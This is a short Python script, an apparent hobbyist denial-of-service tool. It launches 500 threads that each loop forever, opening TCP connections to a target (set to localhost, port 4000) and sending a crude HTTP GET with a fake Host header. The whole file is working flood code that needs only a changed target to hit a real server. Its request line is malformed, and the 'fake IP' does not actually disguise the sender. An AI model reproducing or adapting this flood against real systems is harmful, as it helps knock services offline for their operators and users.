import socket
import threading
# Useless script....\


target = "localhost"
port = 4000
fake_ip = "186.21.22.5"
connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        # global connected
        # connected += 1
        # print(connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()